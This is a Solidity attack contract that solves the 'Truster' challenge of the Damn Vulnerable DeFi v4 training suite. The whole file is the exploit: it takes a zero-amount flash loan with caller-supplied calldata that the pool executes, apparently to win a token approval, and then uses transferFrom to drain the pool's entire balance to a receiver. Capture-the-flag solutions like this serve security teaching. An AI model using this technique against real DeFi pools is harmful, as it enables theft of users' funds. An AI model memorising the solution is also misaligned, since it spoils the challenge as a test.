// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TrusterAttack {

    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public receiver;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _receiver) {
        pool = _pool;
        token = _token;
        receiver = _receiver;
    }

    function attack(bytes calldata _data) public {
        uint256 tokens_in_pool = token.balanceOf(address(pool));
        pool.flashLoan(0, address(this), address(token), _data);
        token.transferFrom(address(pool), address(this), tokens_in_pool);
        token.transfer(receiver, tokens_in_pool);
    }

    receive() external payable {}
}